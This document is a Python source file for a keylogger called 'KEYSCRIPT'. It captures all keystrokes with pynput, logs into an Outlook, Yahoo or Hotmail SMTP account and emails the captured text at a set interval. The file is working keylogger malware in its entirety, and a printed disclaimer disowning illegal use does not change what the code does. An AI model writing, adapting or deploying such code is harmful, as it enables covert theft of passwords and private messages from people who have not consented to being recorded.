from asyncio import sleep
from click import style
from pynput.keyboard import Listener
from threading import Timer
from datetime import datetime
from getpass import getpass
from colorama import init, Fore, Style
from pyfiglet import figlet_format
from termcolor import cprint

import socket
import smtplib
import signal
import sys
import time
import inquirer

EXEC_TIME_START = time.time()

def sigint_handler(signal, frame):
    EXEC_TIME_END = time.time()
    total = round(EXEC_TIME_END - EXEC_TIME_START, 1)
    print (Fore.RED + '\n\nProcess terminated [0]' + Style.RESET_ALL + ' - Execution time: ' + str(total) + " seconds\n")
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

init(autoreset=True)

print("\n")
cprint(figlet_format('KEYSCRIPT', font='slant'))

disclaimer = """Do not attempt to violate the law. 
If you planned to use the content for illegal purpose, 
i'm not be responsible of your actions."""

print(Fore.RED + disclaimer + "\n" + Style.RESET_ALL)

SMTP_INFO = ''
SMTP_PORT = ''

questions = [
  inquirer.List('size',
                message="Select your E-mail Domain",
                choices=['Outlook', 'Gmail', 'Yahoo', 'Hotmail'],
            ),
]
answers = inquirer.prompt(questions)

if answers["size"] == "Outlook":
    SMTP_INFO = 'smtp-mail.outlook.com'
    SMTP_PORT = 587
elif answers["size"] == "Gmail":
    print(Fore.LIGHTRED_EX + "DEPRECATED\n" + Style.RESET_ALL)
    exit()
elif answers["size"] == "Yahoo":
    SMTP_INFO = 'smtp.mail.yahoo.it'
    SMTP_PORT = 465
elif answers["size"] == "Hotmail":
    SMTP_INFO = 'smtp.live.com'
    SMTP_PORT = 465

EMAIL_ADDRESS = input("Email Address: ")

EMAIL_PASSWD = getpass("\nEmail password: ")

flag = False
while flag is False:
    try:
        TIME = float(input("\nSending mail time: "))
        flag = True
    except ValueError:
        print(Fore.YELLOW +"Wrong format value..."+ Style.RESET_ALL)
        flag = False

now = datetime.now()

msg = """ From: Key Script
To: """ + EMAIL_ADDRESS + """
Subject: Keylogger Mail Content

""" + str(disclaimer).upper() + """

[ -- ] STARTING TIME: """ + str(now) + """

""" 

def on_press(key):
    global msg
    keystroke = str(key).replace("'", "")
    
    if keystroke == 'Key.enter': msg += " [ ENTER ] \n"
    elif keystroke == 'Key.backspace': msg = msg[:-1] 
    elif keystroke == 'Key.space': msg += ' '
    elif keystroke == 'Key.caps_lock': msg += ''
    elif "Key" in keystroke: msg += " [ "+ str(key).replace("Key.", "").upper() +" ] "
    else: msg += keystroke

def send():
    global msg
    if len(msg)>0:
        try:
            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
            print("[" + Fore.GREEN + "INFO" + Style.RESET_ALL + "] " + str(datetime.now()) + ": Message Send!\n")
        except smtplib.SMTPServerDisconnected or TimeoutError:
            print("["+ Fore.RED + "ERROR" + Style.RESET_ALL + "] Connection unexpectedly closed...\n")
            exit()
    t1 = Timer(TIME, send)
    t1.daemon = True
    t1.start()
    t1.join()
 
listener = Listener(on_press=on_press)
listener.start()

try:
    server=smtplib.SMTP(SMTP_INFO, SMTP_PORT)
    server.starttls()
except socket.gaierror: 
    print(Fore.LIGHTRED_EX + "\nNo internet connection...\n" + Style.RESET_ALL), exit()

try: server.login(EMAIL_ADDRESS, EMAIL_PASSWD), print(Fore.LIGHTGREEN_EX + "\nConnection ESTABLISHED\n" + Style.RESET_ALL)
except smtplib.SMTPAuthenticationError: print(Fore.LIGHTRED_EX + "\nConnection REFUSED" + Style.RESET_ALL + " (Check credentials or the references)\n"), exit()

main_timer = Timer(5.0, send)
main_timer.daemon = True
main_timer.start()
main_timer.join()